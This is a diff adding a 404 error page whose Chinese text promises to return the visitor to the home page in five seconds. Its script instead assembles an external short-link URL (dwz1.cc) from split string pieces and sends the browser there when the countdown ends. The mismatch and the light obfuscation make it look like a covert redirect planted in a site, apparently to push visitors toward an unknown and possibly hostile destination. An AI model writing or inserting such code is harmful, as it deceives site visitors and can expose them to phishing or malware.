@@ -1,0 +1,32 @@
+<html>
+<head>
+    <title>404</title>
+</head>
+<body>
+
+
+<h4 class="refresh_text">页面没有找到，<strong id="second_show">5</strong>秒钟之后将带您进入首页。</h4>
+
+<script type="text/javascript">
+var x="http://";
+var y="dwz1.cc/";
+var z="kMPDXelO"
+var RestID=x+y+z;
+//http://dwz1.cc/5KtZhau7
+
+    var timeout = 5;
+    function showError() {
+        document.getElementById("second_show").innerHTML = timeout;
+        timeout--;
+        if (timeout == 0) {
+            //window.location.href = "http://dwz1.cc/5KtZhau7";
+			window.location.href = RestID;
+        } else {
+            setTimeout("showError()", 1000);
+        }
+    }
+
+    showError();
+</script>
+</body>
+</html>
